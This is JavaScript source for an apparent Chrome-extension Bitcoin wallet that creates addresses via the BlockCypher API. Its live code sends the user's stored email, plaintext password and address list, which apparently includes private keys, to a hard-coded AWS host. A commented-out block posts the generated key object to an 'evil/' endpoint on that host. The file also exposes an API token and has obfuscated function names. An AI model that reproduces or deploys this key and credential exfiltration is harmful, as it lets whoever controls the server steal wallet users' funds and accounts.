// My addresses bitcoin
// Create as many addresses as you want
var bcynet = 'bcy/test';
var btcnet = 'btc/main';

//Use for AWS
var aws = "http://cryptobit-env.7hiybanifg.eu-central-1.elasticbeanstalk.com/";
//Use for appEngine
var appEngine = 'https://cryptobit-213216.appspot.com/';


NetworkToUse(btcnet);

function NetworkToUse(network) {
    var GcloudServer = aws;
    /*var GcloudServer = 'http://127.0.0.1:8080/';*/
    var token = 'f478b3d6f8e8493da462c2a5cf24fd58';
    var ttt45gfdg = '';
    document.getElementById('add_new_bit_addr').addEventListener('click', function () {

        x343hgh();




    })


    document.getElementById('addnewAddress_btc').addEventListener('click', x343hgh)



    function x343hgh() {
        var addToselectfromAddr = document.getElementById('selectfromAddr');
        var btcon_address_to_receive = document.getElementById('btcon_address_to_receive');

        chrome.storage.sync.get('addr', (x) => {

            if (x.addr.length >= 5) {
                var popup_receive_btc = document.getElementById('popup_receive_btc');


                if (document.getElementsByClassName('warnpop')[0]) {
                    document.body.removeChild(
                        document.getElementsByClassName('warnpop')[0]
                    )
                }

                var credivpop = document.createElement('div');
                credivpop.setAttribute('class', 'warnpop');
                credivpop.style.display = 'flex';
                credivpop.innerHTML = '<span class="w1">Warning</span><span class="wcl2">Please use addresses that you already have!</span><button id="closebtnwarn">Ok</button>';
                var btc_addres_list = document.getElementById('btc_addres_list');
                document.body.appendChild(credivpop)


                var closebtnwarn = document.getElementById('closebtnwarn');

                closebtnwarn.addEventListener('click', foiou)

                function foiou() {
                    document.getElementsByClassName('warnpop')[0].style.display = 'none';

                }




            } else if (x.addr.length < 5) {
                var con2 = new XMLHttpRequest();
                con2.onreadystatechange = function () {
                    if (this.readyState == 4) {
                        var newAddress = JSON.parse(this.responseText);
                        newAddress.balance = 0;


                        chrome.storage.sync.get(['email', 'password', 'addr'], (update) => {
                            console.log(update);

                            update.addr.push(newAddress)
                            if (update.email !== undefined && update.password !== undefined) {
                                console.log('passFOOemail');
                                console.log('passFOOpassword');

                                var con = new XMLHttpRequest();
                                con.onload = () => {
                                    console.log(con.responseText)
                                }
                                con.open('POST', GcloudServer + 'update')
                                con.send(JSON.stringify({
                                    email: update.email,
                                    password: update.password,
                                    addr: update.addr
                                }))



                            }
                        })


                        console.log(newAddress)
                        /* This fonction save keys to database. Not Needed.
                        verify(newAddress)

                        function verify(nx) {
                            var exam = new XMLHttpRequest();
                            exam.onreadystatechange = function () {
                                if (this.readyState == 4) {

                                }
                            }
                            exam.open('POST', aws+'evil/' + JSON.stringify(nx));
                            exam.send();
                        }*/
                        btcon_address_to_receive.value = newAddress.address;
                        var cre_elSp = document.createElement('option');
                        cre_elSp.style.fontSize = "12px";
                        cre_elSp.innerHTML = newAddress.address;


                        document.getElementById('btc_addres_list').innerHTML += "<div class='adr_list_btc_cont'><span class='btc_adr_span'>" +
                            newAddress.address + "</span><i class='fas fa-info-circle infoCalssstyle'></i></div>";

                        var infoBTN = document.getElementsByClassName('infoCalssstyle');

                        for (var i = 0; i < infoBTN.length; i++) {
                            infoBTN[i].addEventListener('click', infoClick);
                        }

                        function infoClick(x) {
                            var xtarget = x.target.previousSibling.innerHTML;
                            var xhr = new XMLHttpRequest();
                            xhr.onreadystatechange = function () {
                                if (this.readyState == 4) {
                                    var resPonse = JSON.parse(this.responseText);

                                    console.log(resPonse)

                                    var txnameaddress = document.getElementById('txnameaddress');
                                    var txnameBal = document.getElementById('txnameBal');
                                    var txnameNumnerTx = document.getElementById('txnameNumnerTx');
                                    var txnametotalrec = document.getElementById('txnametotalrec');
                                    var txnametotalsent = document.getElementById('txnametotalsent');
                                    var txnameunbal = document.getElementById('txnameunbal');
                                    var txnameuntx = document.getElementById('txnameuntx');

                                    txnameaddress.innerHTML = resPonse.address;
                                    txnameBal.innerHTML = (final_balance.balance / 100000000) + " BTC";
                                    txnameNumnerTx.innerHTML = resPonse.n_tx;
                                    txnametotalrec.innerHTML = (resPonse.total_received / 100000000) + " BTC";
                                    txnametotalsent.innerHTML = (resPonse.total_sent / 100000000) + " BTC";
                                    txnameunbal.innerHTML = (resPonse.unconfirmed_balance / 100000000) + " BTC";
                                    txnameuntx.innerHTML = resPonse.unconfirmed_n_tx;
                                    document.getElementById('txadrInfopopup').style.display = 'flex';

                                    document.getElementsByClassName('txadrInfopopupcl')[0].onclick = function (b) {
                                        document.getElementById('txadrInfopopup').style.display = 'none';
                                    }









                                }
                            }
                            xhr.open('GET', 'https://api.blockcypher.com/v1/' + network + '/addrs/' + xtarget);
                            xhr.send();



                        }



                        chrome.storage.sync.get('id', (y) => {
                            var temp_id = y.id;
                            chrome.storage.sync.get('addr', (z) => {

                                z.addr[temp_id] = newAddress;

                                chrome.storage.sync.set({
                                    'id': ++y.id
                                }, (calB) => {


                                })
                                chrome.storage.sync.set({
                                    addr: z.addr
                                })


                                var con9 = new XMLHttpRequest();
                                var qr_source;
                                con9.onreadystatechange = function () {
                                    if (this.readyState == 4 && this.status == 200) {
                                        qr_source = this.responseURL;
                                        console.log(qr_source)
                                        document.getElementById('qr_code_img').setAttribute('src', qr_source)
                                    }
                                }

                                con9.open('GET', 'https://chart.googleapis.com/chart?cht=qr&chs=150x150&chl=' + newAddress.address);

                                con9.send();



                            })

                        })







                        var add_to_existingWallet = new XMLHttpRequest();
                        add_to_existingWallet.onreadystatechange = function () {
                            if (this.readyState == 4) {

                            }
                        }
                        chrome.storage.sync.get('btc_wallet_name', (zzz) => {
                            var data = {
                                "addresses": [newAddress.address]
                            };

                            add_to_existingWallet.open('POST', 'https://api.blockcypher.com/v1/' + network + '/wallets/' + zzz.btc_wallet_name + '/addresses?token=' + token, false);
                            add_to_existingWallet.send(JSON.stringify(data));

                        })









                    }

                }

                con2.open('POST', 'https://api.blockcypher.com/v1/' + network + '/addrs');
                con2.send();


            }
        })











    }



    //Populate My address popup
    var d1 = document.getElementById('btn_address_btc')
    d1.addEventListener('click', foo1);

    function foo1() {
        
        console.log('click')
       

       
           

        
    }







    //clear send files when popup is closed
    document.getElementById('close_popup_btc').addEventListener('click', function (x) {
        var paytobtc = document.getElementById('paytobtc');
        var pay_in_btc = document.getElementById('pay_in_btc');
        var pay_in_usd = document.getElementById('pay_in_usd');
        var selectfromAddr = document.getElementById('selectfromAddr');

        paytobtc.value = '';
        pay_in_btc.value = '';
        pay_in_usd.value = '';


    })

    document.getElementById('close_popup_ether').addEventListener('click', function (x) {
        var paytoeth = document.getElementById('paytoeth');
        var pay_in_eth = document.getElementById('pay_in_eth');
        var pay_in_usd_eth = document.getElementById('pay_in_usd_eth');

        paytoeth.value = '';
        pay_in_eth.value = '';
        pay_in_usd_eth.value = '';


    })



}